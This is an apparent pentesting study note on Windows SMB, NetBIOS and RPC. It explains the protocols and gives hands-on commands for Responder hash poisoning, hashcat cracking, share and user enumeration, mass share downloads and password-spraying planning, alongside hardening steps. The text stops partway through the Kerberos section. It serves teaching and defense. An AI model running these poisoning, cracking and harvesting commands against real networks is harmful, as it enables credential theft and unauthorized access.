# SMB, NetBIOS & RPC: The Windows Plumbing

---
title: "SMB, NetBIOS & RPC"
parent: "[[02_Networking]]"
tags:
  - network
  - windows
  - smb
  - rpc
  - netbios
  - active-directory
  - enumeration
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: While Linux runs on SSH, Windows runs on SMB (Server Message Block) and RPC (Remote Procedure Call). If you are hacking an Internal Network or Active Directory environment, 80% of your time will be spent on TCP/445 and TCP/135. These protocols handle file sharing, printer sharing, remote administration, and **Lateral Movement**. Understanding them is the key to owning the Domain.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [Protocol Definitions: The Trio](#2-protocol-definitions-the-trio)
3. [SMB Versions & Security Evolution](#3-smb-versions--security-evolution)
4. [SMB Protocol Deep Dive](#4-smb-protocol-deep-dive)
5. [NetBIOS Architecture](#5-netbios-architecture)
6. [RPC Mechanisms](#6-rpc-mechanisms)
7. [Enumeration: Listing the Assets](#7-enumeration-listing-the-assets)
8. [Authentication: NTLM vs Kerberos over SMB](#8-authentication-ntlm-vs-kerberos-over-smb)
9. [Null Sessions & Guest Access](#9-null-sessions--guest-access)
10. [SMB Relay Attacks](#10-smb-relay-attacks)
11. [Pass-the-Hash & Credential Reuse](#11-pass-the-hash--credential-reuse)
12. [EternalBlue (MS17-010)](#12-eternalblue-ms17-010)
13. [Lateral Movement Techniques](#13-lateral-movement-techniques)
14. [RPC & Named Pipes: Deep Internal Access](#14-rpc--named-pipes-deep-internal-access)
15. [Defense & Detection](#15-defense--detection)
16. [Practical Lab: Manual SMB Interaction](#16-practical-lab-manual-smb-interaction)
17. [Critical Analysis & Checkpoints](#17-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Distinguish Protocols**: Explain the relationship between NetBIOS (Legacy), SMB (Transport), and RPC (Function).
- **Enumerate Shares**: Find `C$`, `ADMIN$`, and `IPC$` shares using `smbclient` and `crackmapexec`.
- **Exploit Misconfigurations**: Perform SMB Relay attacks against unsigned targets.
- **Execute Code**: Understand how `PsExec` uses SMB Named Pipes to run commands.
- **Secure the Stack**: Explain SMB Signing and how to disable SMBv1.
- **Master Enumeration**: Extract users, groups, shares, and policies from Windows targets.
- **Perform Lateral Movement**: Execute commands on remote systems using various SMB-based techniques.
- **Detect Attacks**: Identify SMB relay attacks and suspicious RPC activity.

---

## 2. Protocol Definitions: The Trio

**BEGINNER EXPLANATION**: Think of Windows networking like a postal system. NetBIOS is the old address book, SMB is the delivery truck, and RPC is the actual message inside the package.

These three protocols often get confused because they work together. Let's separate them clearly.

### 2.1 NetBIOS (Network Basic Input/Output System)

**History**: Created by IBM in 1983 for LAN communication.

**Purpose**: 
- Name resolution (before DNS existed in Windows networks)
- Session establishment
- Datagram distribution

**Key Services**:
```
┌─────────────────────────────────────────────┐
│  NetBIOS Services                           │
├─────────────────────────────────────────────┤
│  UDP/137 - NetBIOS Name Service (NBT-NS)    │
│  UDP/138 - NetBIOS Datagram Service         │
│  TCP/139 - NetBIOS Session Service          │
└─────────────────────────────────────────────┘
```

**NetBIOS Names**:
- 15 characters + 1 suffix byte (type identifier)
- Example: `FILESERVER<20>` (File Server Service)
- Common suffixes:
  - `<00>`: Workstation
  - `<03>`: Messenger Service
  - `<20>`: File Server Service
  - `<1B>`: Domain Master Browser
  - `<1C>`: Domain Controllers
  - `<1D>`: Master Browser

**Attack Vector**: **LLMNR/NBT-NS Poisoning**
- Client broadcasts: "Who is FILESERVER?"
- Attacker responds: "I am FILESERVER, here's my IP"
- Client connects to attacker and sends NTLM hash
- Tool: **Responder**

**Modern Status**: Largely replaced by DNS, but still enabled by default on Windows for backward compatibility.

### 2.2 SMB (Server Message Block)

**BEGINNER EXPLANATION**: SMB is like a multi-purpose delivery truck. It can carry files, printer jobs, commands to start services, and authentication credentials. It's the workhorse of Windows networking.

**Purpose**:
- File and printer sharing
- Inter-process communication
- Network authentication
- Remote administration

**Ports**:
- **TCP/445**: Direct SMB (SMB over TCP, modern)
- **TCP/139**: SMB over NetBIOS (legacy)

**Capabilities**:
- Read/write files on remote shares
- Execute commands remotely
- Browse network resources
- Authenticate users
- Transfer data for other protocols (RPC)

**Versions** (detailed in Section 3):
- SMBv1 (dangerous, outdated)
- SMBv2 (improved performance)
- SMBv3 (encryption support)

### 2.3 RPC (Remote Procedure Call)

**BEGINNER EXPLANATION**: RPC is like a phone call to a specific department. You call the "Service Control Department" and say "Start the Print Spooler service." The department executes your request and reports back.

**Purpose**: 
- Call functions on remote computers as if they were local
- Enable remote administration
- Facilitate distributed computing

**Microsoft RPC (MSRPC)**:
- Proprietary implementation based on DCE/RPC
- Uses UUID to identify services
- Dynamic or static port assignment

**Ports**:
- **TCP/135**: RPC Endpoint Mapper (tells clients which port to use)
- **TCP/49152-65535**: Dynamic RPC ports (configurable)
- **TCP/445**: RPC over SMB via named pipes

**Common RPC Services**:
```
┌──────────────────────────────────────────────────────┐
│ Service                │ Named Pipe    │ Function    │
├──────────────────────────────────────────────────────┤
│ Service Control Mgr    │ \svcctl       │ Start/stop  │
│ Task Scheduler         │ \atsvc        │ Schedule    │
│ Server Service         │ \srvsvc       │ Share mgmt  │
│ Security Acct Manager  │ \samr         │ User mgmt   │
│ Local Security Auth    │ \lsarpc       │ Policy query│
│ Windows Management     │ \winreg       │ Registry    │
└──────────────────────────────────────────────────────┘
```

**Transport Options**:
1. **Direct TCP/IP**: RPC Endpoint Mapper (port 135) + dynamic ports
2. **Over SMB**: Through named pipes (\\\\server\\pipe\\pipename)
3. **Over HTTP/HTTPS**: For RPC-over-HTTP scenarios

### 2.4 Protocol Relationship Diagram

```
Application Layer
    │
    ├─── File Transfer ───────────────────────┐
    ├─── Remote Admin (PsExec, WMI) ─────────┤
    ├─── Service Control ─────────────────────┤
    │                                          │
    ▼                                          ▼
┌─────────┐                              ┌─────────┐
│   SMB   │                              │   RPC   │
│ (Share) │                              │(Command)│
└────┬────┘                              └────┬────┘
     │                                        │
     │        ┌───────────────────────────────┤
     │        │                               │
     ▼        ▼                               ▼
┌────────────────┐                  ┌──────────────┐
│ TCP/445 (SMB)  │                  │ TCP/135 (EPM)│
│ TCP/139 (NBT)  │                  │ Dynamic Ports│
└────────────────┘                  └──────────────┘
     │                                        │
     └────────────────┬───────────────────────┘
                      ▼
              ┌───────────────┐
              │  TCP/IP Stack │
              └───────────────┘
```

---

## 3. SMB Versions & Security Evolution

### 3.1 Version Comparison Table

| Version | Released | Windows OS | Features | Security | Attack Surface |
|---------|----------|------------|----------|----------|----------------|
| **SMBv1** | 1984 | XP, 2003 | Basic file sharing, chatty protocol | No encryption, weak auth | **CRITICAL** - EternalBlue, SMB relay |
| **SMBv2.0** | 2006 | Vista, 2008 | Reduced chattiness, compound requests | Signing optional | Medium - Relay if unsigned |
| **SMBv2.1** | 2009 | Win7, 2008 R2 | Large MTU, client oplock leasing | Improved signing | Medium |
| **SMBv3.0** | 2012 | Win8, 2012 | **Encryption**, multichannel, VSS | End-to-end encryption | Low (if properly configured) |
| **SMBv3.02** | 2013 | Win8.1, 2012 R2 | Performance improvements | Enhanced encryption | Low |
| **SMBv3.1.1** | 2015 | Win10, 2016+ | Pre-auth integrity, AES-128-GCM | **Secure** - Mandatory signing for DC | Very Low |

### 3.2 SMBv1 - The Dangerous Legacy

**Why It's Dangerous**:
1. **No Encryption**: All traffic in cleartext
2. **Weak Authentication**: Vulnerable to relay attacks
3. **Buffer Overflows**: MS17-010 (EternalBlue), MS08-067
4. **Chatty Protocol**: Excessive round trips (performance issue)

**EternalBlue Impact**:
- Exploited by WannaCry (2017)
- Exploited by NotPetya (2017)
- Remote code execution as SYSTEM
- Wormable (self-propagating)

**Disable SMBv1**:
```powershell
# PowerShell (as Admin)
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Or via Registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Value 0
```

**Detect SMBv1 Usage**:
```powershell
Get-SmbConnection | Select-Object -Property ServerName, Dialect, UserName
```

### 3.3 SMBv2 - The Performance Upgrade

**Improvements Over SMBv1**:
- Reduced command set (19 commands vs 100+)
- Compound requests (multiple operations in one packet)
- Larger buffer sizes (1 MB vs 64 KB)
- Durable handles (reconnect after network interruption)
- Credit-based flow control

**Security Features**:
- Message signing (optional by default)
- More secure negotiate protocol
- Resilient file handles

**Limitations**:
- No encryption (until SMBv3)
- Still vulnerable to relay if signing disabled

### 3.4 SMBv3 - The Encrypted Era

**Major Security Features**:

**1. End-to-End Encryption**:
```powershell
# Enable encryption on share
Set-SmbShare -Name "SecureShare" -EncryptData $true

# Require encryption for all connections
Set-SmbServerConfiguration -EncryptData $true
```

**Encryption Details**:
- AES-128-CCM (SMBv3.0)
- AES-128-GCM (SMBv3.1.1, faster)
- Transparent to applications
- Protects against packet sniffing

**2. Pre-Authentication Integrity**:
- SMBv3.1.1 feature
- Uses SHA-512 hash to protect negotiate
- Prevents downgrade attacks

**3. Secure Dialect Negotiation**:
- Cryptographically protects version selection
- Attacker cannot force downgrade to SMBv1

**4. Multichannel**:
- Automatic failover and load balancing
- Uses multiple NICs simultaneously
- Improves performance and reliability

### 3.5 Detection and Enumeration of SMB Versions

**Using Nmap**:
```bash
nmap -p445 --script smb-protocols 192.168.1.100
```

**Using Metasploit**:
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

**Using CrackMapExec**:
```bash
nxc smb 192.168.1.0/24
```

**Manual Detection with Scapy**:
```python
#!/usr/bin/env python3
from scapy.all import *

def detect_smb_version(target_ip):
    # SMB Negotiate Request
    pkt = IP(dst=target_ip)/TCP(dport=445, flags='S')
    response = sr1(pkt, timeout=2, verbose=0)
    
    if response and response.haslayer(TCP) and response[TCP].flags & 0x12:  # SYN-ACK
        # Complete handshake
        ack = IP(dst=target_ip)/TCP(dport=445, sport=response[TCP].dport, 
                                     flags='A', seq=response[TCP].ack, 
                                     ack=response[TCP].seq + 1)
        send(ack, verbose=0)
        
        # Send SMB Negotiate
        negotiate = (
            b"\x00\x00\x00\x85"  # NetBIOS Session
            b"\xff\x53\x4d\x42"  # SMB1 Header
            b"\x72\x00\x00\x00"  # Negotiate Protocol
            b"\x00\x18\x53\xc8\x00\x00"
            # ... (full SMB negotiate packet)
        )
        
        smb_pkt = IP(dst=target_ip)/TCP(dport=445, sport=response[TCP].dport)/Raw(load=negotiate)
        smb_response = sr1(smb_pkt, timeout=2, verbose=0)
        
        if smb_response and smb_response.haslayer(Raw):
            data = bytes(smb_response[Raw])
            if b"SMB" in data:
                print(f"[+] SMB detected on {target_ip}")
                # Parse dialect
                return True
    
    return False

# detect_smb_version("192.168.1.100")
```

---

## 4. SMB Protocol Deep Dive

**BEGINNER EXPLANATION**: SMB is like HTTP for files. Just as HTTP has GET/POST requests, SMB has commands like OPEN, READ, WRITE, CLOSE. But SMB also handles authentication, permissions, and locking.

### 4.1 SMB Packet Structure

**SMBv1 Header**:
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     NetBIOS Session Header                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     0xFF 'SMB' (Protocol)                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Command    |   Status (4 bytes)                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Flags      |    Flags2     |   PID High    |  Signature   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Tree ID (TID)                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      Process ID (PID)                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        User ID (UID)                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Multiplex ID (MID)                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**SMBv2/v3 Header** (Simplified):
```
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     0xFE 'SMB' (Protocol)                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Header Length (64 bytes)     |     Credit Charge             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      Status / Channel Sequence                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Command            |         Credit Req/Resp       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                            Flags                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Message ID                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Tree ID / Session ID                  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 4.2 SMB Connection Flow

```
Client                                          Server
  │                                                │
  │  1. TCP SYN (port 445)                        │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  2. TCP SYN-ACK                               │
  │<──────────────────────────────────────────────┤
  │                                                │
  │  3. TCP ACK                                   │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  4. SMB Negotiate Protocol Request            │
  │     (Supported dialects: SMB 2.002, 3.0...)   │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  5. SMB Negotiate Protocol Response           │
  │     (Selected dialect: SMB 3.1.1)             │
  │     (Server GUID, Capabilities, Security Mode)│
  │<──────────────────────────────────────────────┤
  │                                                │
  │  6. SMB Session Setup Request                 │
  │     (NTLM/Kerberos authentication)            │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  7. SMB Session Setup Response                │
  │     (Session ID, Auth Status)                 │
  │<──────────────────────────────────────────────┤
  │                                                │
  │  8. SMB Tree Connect Request                  │
  │     (\\SERVER\Share)                          │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  9. SMB Tree Connect Response                 │
  │     (Tree ID, Share Type, Access Rights)      │
  │<──────────────────────────────────────────────┤
  │                                                │
  │  10. SMB Commands (CREATE, READ, WRITE, etc.) │
  │<─────────────────────────────────────────────>│
  │                                                │
  │  11. SMB Tree Disconnect                      │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  12. SMB Logoff                               │
  ├──────────────────────────────────────────────>│
  │                                                │
  │  13. TCP FIN                                  │
  ├──────────────────────────────────────────────>│
```

### 4.3 Key SMB Commands

**SMBv1 Commands**:
- `SMB_COM_NEGOTIATE` (0x72): Negotiate protocol version
- `SMB_COM_SESSION_SETUP_ANDX` (0x73): Authenticate user
- `SMB_COM_TREE_CONNECT_ANDX` (0x75): Connect to share
- `SMB_COM_NT_CREATE_ANDX` (0xA2): Open/create file
- `SMB_COM_READ_ANDX` (0x2E): Read from file
- `SMB_COM_WRITE_ANDX` (0x2F): Write to file
- `SMB_COM_CLOSE` (0x04): Close file

**SMBv2/v3 Commands**:
- `SMB2_NEGOTIATE` (0x00): Negotiate dialect
- `SMB2_SESSION_SETUP` (0x01): Establish session
- `SMB2_LOGOFF` (0x02): End session
- `SMB2_TREE_CONNECT` (0x03): Connect to share
- `SMB2_TREE_DISCONNECT` (0x04): Disconnect from share
- `SMB2_CREATE` (0x05): Create/open file
- `SMB2_CLOSE` (0x06): Close file
- `SMB2_READ` (0x08): Read data
- `SMB2_WRITE` (0x09): Write data
- `SMB2_IOCTL` (0x0B): Device control

### 4.4 Administrative Shares

**Default Hidden Shares**:
```
\\SERVER\C$         - Root of C: drive (Admin only)
\\SERVER\D$         - Root of D: drive (Admin only)
\\SERVER\ADMIN$     - %SystemRoot% (usually C:\Windows)
\\SERVER\IPC$       - Inter-Process Communication (null sessions)
\\SERVER\PRINT$     - Printer drivers
```

**Access Requirements**:
- `C$`, `D$`, `ADMIN$`: Local Administrator or Domain Admin
- `IPC$`: Any authenticated user (or Guest/Null on legacy systems)

**Security Implications**:
- `C$` access = full system compromise
- `ADMIN$` access = ability to upload tools, modify system files
- `IPC$` access = enumeration, RPC calls

**Disable Administrative Shares** (NOT recommended for AD):
```powershell
# Registry edit
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "AutoShareWks" -Value 0
```

---

## 5. NetBIOS Architecture

### 5.1 NetBIOS Name Resolution Process

```
1. Client needs to connect to "FILESERVER"
   │
   ├─> 2. Check NetBIOS Name Cache
   │      ├─ Found? → Use cached IP
   │      └─ Not found? → Continue
   │
   ├─> 3. Query WINS Server (if configured)
   │      ├─ Response? → Use IP
   │      └─ No response? → Continue
   │
   ├─> 4. Broadcast NBT-NS Query (UDP/137)
   │      "Who is FILESERVER?"
   │      ├─ Real FILESERVER responds
   │      └─ Attacker can also respond (poisoning)
   │
   ├─> 5. Check LMHOSTS file
   │      ├─ Entry found? → Use IP
   │      └─ Not found? → Continue
   │
   └─> 6. Fallback to DNS
          └─ Query for "FILESERVER.domain.com"
```

**Attack Window**: Step 4 (Broadcast) allows attackers to respond faster than legitimate server.

### 5.2 LLMNR/NBT-NS Poisoning Attack

**BEGINNER EXPLANATION**: Imagine someone in an office shouts "Who has the key to the supply room?" and a thief responds "I do, come to my desk." The person gives the key (their password hash) to the thief instead of the real keyholder.

**Attack Flow**:
```
Victim                   Attacker (Responder)          Real Server
  │                              │                          │
  │ 1. Try to access             │                          │
  │    \\FILESHARE\docs          │                          │
  │                              │                          │
  │ 2. Broadcast NBT-NS:         │                          │
  │    "Who is FILESHARE?"       │                          │
  ├─────────────────────────────>│                          │
  │                              │                          │
  │ 3. Poisoned Response:        │                          │
  │    "I am FILESHARE" (Attacker IP)                      │
  │<─────────────────────────────┤                          │
  │                              │                          │
  │ 4. SMB Auth to Attacker      │                          │
  │    (sends NTLMv2 hash)       │                          │
  ├─────────────────────────────>│                          │
  │                              │                          │
  │                         Attacker captures hash          │
  │                         and cracks offline              │
```

**Responder Tool**:
```bash
# Basic usage
responder -I eth0 -wv

# Analyze mode (don't poison, just listen)
responder -I eth0 -A

# WPAD attack
responder -I eth0 -wv --wpad
```

**Captured Hash Example**:
```
john::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000000000
```

**Crack with Hashcat**:
```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

**Defense**:
```powershell
# Disable LLMNR
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0

# Disable NBT-NS via Group Policy or PowerShell
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS over TCP/IP
}
```

---

## 6. RPC Mechanisms

**BEGINNER EXPLANATION**: RPC is like making a phone call to another computer and asking it to do something. You dial a number (port), ask for a specific department (service UUID), and request an action ("start this service").

### 6.1 RPC Architecture

**Endpoint Mapper (TCP/135)**:
- Acts as a directory service
- Clients ask: "Where can I find the Service Control Manager?"
- EPM responds: "It's on port 49152"

**Dynamic Port Allocation**:
```
Client                    EPM (135)              RPC Service
  │                          │                        │
  │ 1. Connect to EPM        │                        │
  ├─────────────────────────>│                        │
  │                          │                        │
  │ 2. "Where is UUID         │                        │
  │     367abb81-9844-...?"  │                        │
  ├─────────────────────────>│                        │
  │                          │                        │
  │ 3. "It's on port 49152"  │                        │
  │<─────────────────────────┤                        │
  │                          │                        │
  │ 4. Connect to 49152      │                        │
  ├────────────────────────────────────────────────────>│
  │                          │                        │
  │ 5. Send RPC command      │                        │
  ├────────────────────────────────────────────────────>│
  │                          │                        │
  │ 6. Response              │                        │
  │<────────────────────────────────────────────────────┤
```

### 6.2 RPC Over Named Pipes

**Why Named Pipes?**:
- Avoids firewall issues (reuses SMB port 445)
- Simplifies authentication (inherits SMB session)
- Enables remote administration through firewalls

**Named Pipe Path**:
```
\\SERVER\pipe\pipename
```

**Common Named Pipes**:
```
\pipe\svcctl          - Service Control Manager
\pipe\atsvc           - Task Scheduler (legacy)
\pipe\samr            - Security Account Manager (user/group management)
\pipe\lsarpc          - Local Security Authority (policy queries)
\pipe\winreg          - Remote Registry
\pipe\wkssvc          - Workstation Service
\pipe\srvsvc          - Server Service (share management)
\pipe\netlogon        - Netlogon (domain authentication)
\pipe\spoolss         - Print Spooler
```

### 6.3 RPC Enumeration with rpcclient

**Connect to Target**:
```bash
# Null session (if allowed)
rpcclient -U "" -N 192.168.1.100

# With credentials
rpcclient -U "CORP\john" 192.168.1.100
```

**Common Commands**:
```bash
# Enumerate users
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[john] rid:[0x3e8]

# Get user info
rpcclient $> queryuser 0x1f4
    User Name   :   Administrator
    Full Name   :   
    Home Drive  :   
    Logon Script:
    Profile Path:

# Enumerate groups
rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]

# Get group members
rpcclient $> querygroupmem 0x200
    rid:[0x1f4] attr:[0x7]  # Administrator

# Query domain info
rpcclient $> querydominfo
Domain:     CORP
Server:     DC01
SID:        S-1-5-21-1234567890-...

# Get SID for username
rpcclient $> lookupnames john
john S-1-5-21-...-1000 (User: 1)

# Get password policy
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000001
```

### 6.4 RPC Service UUIDs

**Critical Service UUIDs**:
```
Service Control Manager:
UUID: 367abb81-9844-35f1-ad32-98f038001003

Task Scheduler:
UUID: 1ff70682-0a51-30e8-076d-740be8cee98b

Windows Management Instrumentation:
UUID: 8bc3f05e-d86b-11d0-a075-00c04fb68820

Security Account Manager:
UUID: 12345778-1234-abcd-ef00-0123456789ac
```

**Enumerate RPC Services with impacket**:
```bash
# Using impacket's rpcdump
rpcdump.py 192.168.1.100

# Output shows all registered RPC interfaces:
Protocol: [MS-SCMR]: Service Control Manager
UUID: 367abb81-9844-35f1-ad32-98f038001003
Binding: ncacn_np:\\\\SERVER[\\PIPE\\svcctl]
```

---

## 7. Enumeration: Listing the Assets

**BEGINNER EXPLANATION**: Enumeration is like casing a building before a heist. You need to know where the doors are (shares), who has keys (users), and what valuables are inside (sensitive files).

### 7.1 Share Enumeration

**Using smbclient**:
```bash
# List shares (null session)
smbclient -L //192.168.1.100 -N

# List shares (with credentials)
smbclient -L //192.168.1.100 -U "CORP\john%Password123"

# Access a specific share
smbclient //192.168.1.100/Share -U "CORP\john%Password123"

# Download all files recursively
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

**Using CrackMapExec (NetExec)**:
```bash
# Enumerate shares on subnet
nxc smb 192.168.1.0/24 -u john -p Password123 --shares

# Find readable shares
nxc smb 192.168.1.0/24 -u john -p Password123 --shares --filter-shares READ

# Spider shares and download files
nxc smb 192.168.1.100 -u john -p Password123 -M spider_plus

# Search for specific files
nxc smb 192.168.1.100 -u john -p Password123 --spider C$ --pattern '*.config'
```

**Using enum4linux-ng**:
```bash
# Full enumeration
enum4linux-ng -A 192.168.1.100

# Specific enumeration targets
enum4linux-ng -S 192.168.1.100  # Shares only
enum4linux-ng -U 192.168.1.100  # Users only
enum4linux-ng -G 192.168.1.100  # Groups only
enum4linux-ng -P 192.168.1.100  # Password policy
```

### 7.2 User and Group Enumeration

**Using RPC**:
```bash
# Enumerate domain users
rpcclient -U "CORP\john%Pass123" 192.168.1.100 -c "enumdomusers"

# Get user details
for rid in $(seq 500 1100); do
    rpcclient -U "CORP\john%Pass123" 192.168.1.100 -c "queryuser 0x$(printf '%x' $rid)" 2>/dev/null | grep "User Name"
done
```

**Using impacket**:
```bash
# Enumerate users via SAM
lookupsid.py CORP/john:Pass123@192.168.1.100

# Get user information
samrdump.py CORP/john:Pass123@192.168.1.100
```

**Using LDAP (if available)**:
```bash
# Anonymous LDAP bind
ldapsearch -x -H ldap://192.168.1.100 -b "DC=corp,DC=local" "(objectClass=user)"

# Authenticated LDAP
ldapsearch -x -H ldap://192.168.1.100 -D "CORP\john" -w Pass123 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

### 7.3 Password Policy Enumeration

**Using CrackMapExec**:
```bash
nxc smb 192.168.1.100 -u john -p Pass123 --pass-pol
```

**Using rpcclient**:
```bash
rpcclient -U "CORP\john%Pass123" 192.168.1.100 -c "getdompwinfo"
```

**Output Interpretation**:
```
min_password_length: 7
password_complexity: 1      # Enabled
password_properties: 0x1
max_password_age: 42 days
min_password_age: 1 day
lockout_threshold: 5        # Account locks after 5 failures
lockout_duration: 30 min
lockout_window: 30 min
```

**Attack Planning**:
- Lockout threshold 0 = no lockout (spray freely)
- Lockout threshold > 0 = careful spraying (stay under threshold)
- Password complexity = must include uppercase, lowercase, digits, symbols

### 7.4 Automated Enumeration Script

```python
#!/usr/bin/env python3
import subprocess
import json
import sys

def enum_smb(target, username="", password=""):
    """
    Automated SMB enumeration
    """
    results = {
        "target": target,
        "shares": [],
        "users": [],
        "groups": [],
        "policy": {}
    }
    
    # Enumerate shares
    try:
        cmd = f"smbclient -L //{target} -N" if not username else f"smbclient -L //{target} -U '{username}%{password}'"
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
        
        for line in output.split('\n'):
            if 'Disk' in line or 'IPC' in line:
                share_name = line.split()[0]
                results["shares"].append(share_name)
    except:
        pass
    
    # Enumerate users via RPC
    if username and password:
        try:
            cmd = f"rpcclient -U '{username}%{password}' {target} -c 'enumdomusers'"
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
            
            for line in output.split('\n'):
                if 'user:[' in line:
                    user = line.split('[')[1].split(']')[0]
                    results["users"].append(user)
        except:
            pass
        
        # Get password policy
        try:
            cmd = f"rpcclient -U '{username}%{password}' {target} -c 'getdompwinfo'"
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
            
            for line in output.split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    results["policy"][key.strip()] = value.strip()
        except:
            pass
    
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [username] [password]")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else ""
    password = sys.argv[3] if len(sys.argv) > 3 else ""
    
    print(f"[*] Enumerating {target}...")
    results = enum_smb(target, username, password)
    print(json.dumps(results, indent=2))
```

---

## 8. Authentication: NTLM vs Kerberos over SMB

**BEGINNER EXPLANATION**: NTLM is like showing a secret handshake to prove you know the password. Kerberos is like showing a ticket you got from a trusted ticket office (the Domain Controller).

### 8.1 NTLM Authentication Flow

**Challenge-Response Protocol**:
```
Client                                Server
  │                                      │
  │ 1. Negotiate Request                │
  │    (I want to auth as "john")       │
  ├─────────────────────────────────────>│
  │                                      │
  │ 2. Challenge                        │
  │    (Random 8-byte nonce: 0x1234...) │
  │<─────────────────────────────────────┤
  │                                      │
  │ Client computes:                     │
  │ Response = HMAC_MD5(NTLMHash, Challenge)
  │                                      │
  │ 3. Authenticate                     │
  │    (Username, Domain, Response)     │
  ├─────────────────────────────────────>│
  │                                      │
  │                Server verifies:      │
  │                - Gets john's hash from SAM/AD
  │                - Computes same HMAC_MD5
  │                - Compares with client's response
  │                                      │
  │ 4. Access Granted/Denied            │
  │<─────────────────────────────────────┤
```

**NTLMv1 vs NTLMv2**:

| Feature | NTLMv1 | NTLMv2 |
|---------|--------|--------|
| Hash Algorithm | MD4 | HMAC-MD5 |
| Challenge Size | 8 bytes (server-only) | 16 bytes (client + server) |
| Replay Protection | Weak | Strong (includes timestamp) |
| Security | **Broken** (rainbow tables) | Moderate |
| Relay Protection | None | None (both vulnerable to relay) |

**Captured NTLMv2 Hash Format**:
```
john::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000000000...
└┬──┘ └─┬┘ └─┬─┘ └──────┬──────┘  └────┬────┘   └─────┬─────┘
User Domain Server    Challenge      Response      Blob
         Name                                   (includes timestamp)
```

### 8.2 Kerberos Authentication Flow

**Ticket-Granting Ticket (TGT) Process**:
```
Client                   KDC (DC)                Service (SMB)
  │                          │                         │
  │ 1. AS-REQ               │                         │
  │    (Username, timestamp │                         │
  │     encrypted with      │                         │
  │     user's key)         │                         │
  ├────────────────────────>│                         │
  │                          │                         │
  │ 2. AS-REP               │                         │
  │    (TGT + Session Key)  │                         │
  │<────────────────────────┤                         │
  │                          │                         │
  │ 3. TGS-REQ              │                         │
  │    (TGT + SPN:          │                         │
  │     cifs/fileserver)    │                         │
  ├────────────────────────>│                         │
  │                          │                         │
